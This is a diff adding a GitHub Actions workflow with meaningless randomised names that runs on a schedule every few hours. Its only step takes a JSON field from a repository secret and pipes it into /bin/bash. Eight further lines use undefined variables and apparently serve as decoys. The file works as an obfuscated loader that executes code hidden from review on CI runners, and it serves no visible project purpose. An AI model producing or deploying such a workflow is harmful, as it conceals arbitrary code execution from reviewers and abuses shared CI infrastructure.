@@ -1,0 +1,25 @@
+name: zhangjushi4109
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangjushi4109
+        env:
+          t5001: ${{ secrets.t5001 }}
+        run: |
+          echo $t5001 | jq -r .uwl6291 | /bin/bash
+          echo $an8575 | jq -r .kjily34 | /bin/bash
+          echo $mlo4850 | jq -r .ao112 | /bin/bash
+          echo $yppu65837 | jq -r .zc3 | /bin/bash
+          echo $xohgz24 | jq -r .kqqt7761 | /bin/bash
+          echo $oo952 | jq -r .kmy15 | /bin/bash
+          echo $w32717 | jq -r .xepik88109 | /bin/bash
+          echo $ze52 | jq -r .gm4 | /bin/bash
+          echo $v8228 | jq -r .sa268 | /bin/bash
+
